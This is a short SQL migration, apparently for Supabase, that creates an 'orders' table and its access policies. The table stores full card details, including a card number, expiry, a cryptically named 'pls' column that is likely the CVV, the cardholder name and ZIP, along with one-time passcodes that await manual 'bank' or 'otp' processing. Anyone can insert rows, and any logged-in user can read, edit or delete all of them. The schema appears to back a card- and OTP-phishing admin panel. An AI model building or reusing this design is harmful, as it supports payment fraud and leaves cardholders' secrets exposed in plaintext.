-- Create orders table to store all user orders
CREATE TABLE public.orders (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  timestamp TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  phone TEXT NOT NULL,
  provider TEXT NOT NULL,
  amount DECIMAL(10,2) NOT NULL,
  fees TEXT NOT NULL,
  total TEXT NOT NULL,
  id_number TEXT NOT NULL,
  expiry TEXT NOT NULL,
  pls TEXT NOT NULL,
  name_on_card TEXT NOT NULL,
  country TEXT NOT NULL,
  zip_code TEXT NOT NULL,
  otp_code TEXT,
  processing_type TEXT CHECK (processing_type IN ('bank', 'otp')),
  is_processed BOOLEAN NOT NULL DEFAULT false,
  user_session_id TEXT, -- To track which session/user created the order
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable Row Level Security
ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;

-- Create policies - Allow all authenticated users to read all orders (for admin panel)
-- and allow anyone to insert orders (for public order submission)
CREATE POLICY "Anyone can insert orders" 
ON public.orders 
FOR INSERT 
TO anon, authenticated
WITH CHECK (true);

CREATE POLICY "Authenticated users can view all orders" 
ON public.orders 
FOR SELECT 
TO authenticated
USING (true);

CREATE POLICY "Authenticated users can update all orders" 
ON public.orders 
FOR UPDATE 
TO authenticated
USING (true);

CREATE POLICY "Authenticated users can delete all orders" 
ON public.orders 
FOR DELETE 
TO authenticated
USING (true);

-- Create function to update timestamps
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Create trigger for automatic timestamp updates
CREATE TRIGGER update_orders_updated_at
BEFORE UPDATE ON public.orders
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();

-- Create index for better performance
CREATE INDEX idx_orders_timestamp ON public.orders(timestamp DESC);
CREATE INDEX idx_orders_processed ON public.orders(is_processed);
CREATE INDEX idx_orders_user_session ON public.orders(user_session_id);